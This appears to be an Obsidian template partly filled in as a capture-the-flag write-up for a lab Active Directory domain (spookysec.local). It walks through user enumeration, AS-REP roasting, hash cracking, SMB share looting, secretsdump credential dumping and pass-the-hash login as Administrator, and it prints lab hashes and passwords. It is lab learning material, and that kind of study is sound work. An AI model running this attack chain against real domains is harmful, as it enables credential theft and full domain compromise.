Use this template in Obsidian to register your findings per target.

---
## 🖥️ Target System: `IP/Hostname`

IP - 10.10.130.140 | 10.10.185.102

<summary>1. 🧭 Initial Reconnaissance</summary>

- **Tools Used**: 
- **Host Discovery**:
  - Was the host alive? (Yes/No)
  - Ping Response:

![[Pasted image 20250630150742.png]]

- **Port Scan Results**:

```
nmap -Pn -n -T4 -sCV 10.10.193.236
```

-n does not make names resolution

  - Open Ports:
  - Service Versions:
  - OS Detection:

![[port_scan 4.txt]]

![[Pasted image 20250630151739.png]]

---

<summary>2. 📂 Enumeration</summary>

- **Ports/Services Analyzed**: 
- **Tools Used**: kerbrute
- **Findings**:
  - Directories found:
  - Enumerated users/accounts:
used: kerbrute userenum -d spookysec.local --dc 10.10.130.140 users.txt 

2025/06/30 15:40:20 >  [+] VALID USERNAME:	 james@spookysec.local
2025/06/30 15:40:22 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2025/06/30 15:40:24 >  [+] VALID USERNAME:	 James@spookysec.local
2025/06/30 15:40:24 >  [+] VALID USERNAME:	 robin@spookysec.local
2025/06/30 15:40:31 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2025/06/30 15:40:35 >  [+] VALID USERNAME:	 administrator@spookysec.local
2025/06/30 15:40:43 >  [+] VALID USERNAME:	 backup@spookysec.local
2025/06/30 15:40:47 >  [+] VALID USERNAME:	 paradox@spookysec.local
2025/06/30 15:41:13 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2025/06/30 15:41:21 >  [+] VALID USERNAME:	 Robin@spookysec.local
2025/06/30 15:42:11 >  [+] VALID USERNAME:	 Administrator@spookysec.local


using Impacket:

```
GetNPUsers.py spookysec.local/ -no-pass -usersfile users.txt -dc-ip 10.10.130.140 -request
```

got svc-admin hash

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:60b1ba7cb12aae2ef5d069fb179fa0cf$7386686db49d629b65426764205f28f9d611076740e030eba727ee87f74e80e621d0fec856619ff7532e6b7b45c126b0f745a31facd7b2b9fd9fdf986a112e978d3224fe634232d9a7bd699d8ec1aa7c87f9787bec3fcc8c2e0adde43980cfbee6ee59edab2bb16be6f5e8a476f7270f59e90bc669d6937be2476095934969f89590bcd867f2e983edd9ebb27bc81bc853e133c83955b8d62d8e09caca9c70584e8b579b96de08c44c7ed09e4a42884983fe0a000ee2a4c0bb7e70d9215e14402ca06a28217cd645d0e1dc854cd72f67b3386b0f3c62853b837bb45e7b85fd966cbdd9c8fa85dbacc79d13995f63b7f8b483

using hashcat:  

```
hashcat -m 18200 hash.txt passwords.txt 
```

got
- username: svc-admin
- password: management2005

  - Software versions:
- **Screenshots/Proof**:

![[Pasted image 20250630160138.png]]

Using smbclient:

```
smbclient -L //10.10.185.102 -U 'THM-AD/svc-admin%management2005'

```

![[Pasted image 20250707151309.png]]

We can now enter the backup share

```
smbclient //10.10.185.102/backup -U 'THM-AD/svc-admin%management2005'
```

we can list what is in the backup and retrieve the data

![[Pasted image 20250707151712.png]]

in the file we have the following credentials

```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Using cyberchef we can decode the credential:

```
backup@spookysec.local:backup2517860
```

domain: spookysec.local
user:  backup
pass: backup2517860

using Impacket secretsdump.py


```
secretsdump.py 'spookysec.local/backup:backup2517860@10.10.135.91'
```


### 🧱 Breaking it Down:

| Part                                                  | Explanation                                                                   |
| ----------------------------------------------------- | ----------------------------------------------------------------------------- |
| `secretsdump.py`                                      | The tool being run (from Impacket)                                            |
| `'spookysec.local/backup:backup2517860@10.10.135.91'` | The authentication and target string. Let's break this further:               |
| `spookysec.local`                                     | The **domain name** (Active Directory domain)                                 |
| `backup`                                              | The **username** you're using to authenticate                                 |
| `backup2517860`                                       | The **password** for the `backup` user                                        |
| `10.10.135.91`                                        | The **IP address** of the target system (most likely a **domain controller**) |
we get the followin hashes:

![[Pasted image 20250707153159.png]]

Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::

using evil-winrm

```
evil-winrm -i 10.10.185.102 -u administrator -H 0e0363213e37b94221497260b0bcb4fc

```

we have access to the adminstrator

![[Pasted image 20250707155446.png]]

---

<summary>3. 🚨 Vulnerability Analysis</summary>

- **Identified Vulnerabilities**:
  - Description:
  - CVE/Exploit DB Ref:
- **Tool(s) Used**: 
- **Proof/Output**:
  - Command results, error messages, etc.

---


<summary>4. 💣 Exploitation</summary>

- **Tool(s) Used**:
- **Exploit/Payload**:
  - Command:
- **Result**:
  - Got Shell? User Access?
- **Post-Exploitation Notes**:
  - E.g., accessed user.txt
- **Proof**:
  - ![[proof-shell.png]]
---

<summary>5. 🪜 Privilege Escalation</summary>

- **Initial Access Level**:
- **Techniques Tried**:
  - E.g., sudo -l, linPEAS, SUID checks
- **Success Path**:
  - Commands used:
- **Root Access?** (Yes/No)
- **Proof**:
  - ![[proof-root.png]]
---

<summary>6. 🗃️ Post-Exploitation</summary>

- **Files/Flags Accessed**:
- **Sensitive Data Found**:
  - Passwords, config files:
- **Users Compromised**:
- **Persistence (if tested)**:

---

<summary>7. 📓 Lessons Learned</summary>

- **What Worked**:
- **What Didn’t**:
- **To Improve**:

---

<summary>8. 📎 Appendix</summary>

- Screenshot Links:
  - ![[example.png]]
- Full Command Logs:
  - Use code blocks for clarity:
    ```bash
    command here
    output here
    ```
- Exploit Code Used:
  ```python
  # Sample exploit
